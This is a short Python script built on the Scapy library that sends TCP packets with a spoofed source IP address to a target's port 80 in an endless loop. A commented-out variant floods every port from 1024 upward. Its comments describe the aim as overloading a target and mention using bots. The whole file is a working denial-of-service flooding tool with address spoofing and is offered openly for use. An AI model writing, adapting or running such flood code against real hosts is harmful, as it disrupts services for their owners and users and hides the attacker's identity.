#!/usr/bin/python3

from scapy.all import *
# -------------------------------------
# Function - For a single port. 
# Imports the src, dst, message
def synflood(source, target, message):
    destport=80  # Set target port
    # Create 3 layers needed for this packet
    IPLayer = IP(src=source, dst=target)
    TCPLayer = TCP(sport=4444, dport=destport)
    RAWLayer = Raw(load=message)  # Needed for the message
    pkt = IPLayer/TCPLayer/RAWLayer  # Packet created from 3 layers
    send(pkt)  # Send the packet
# -------------------------------------------------
# --- For a range of ports ------------------------
#def synflood(source, target, message):
#    for destport in range(1024, 65535):
#        IPLayer = IP(src=source, dst=target)
#        TCPLayer = TCP(sport=4444, dport=destport)
#        RAWLayer = Raw(load=message)
#        pkt = IPLayer/TCPLayer/RAWLayer
#        send(pkt)
# ------------------------------------------------------
source = input("[*] Enter Source IP Address to Fake: ")
target = input("[*] Enter Targets IP Address: ")
message = input("[*] Ener the Message for TCP Payload: ")
# -------------------------------------------------------
# This runs until interruption. 
# Allows us to overload a port/target, but may need bots
while True:
    synflood(source, target, message)
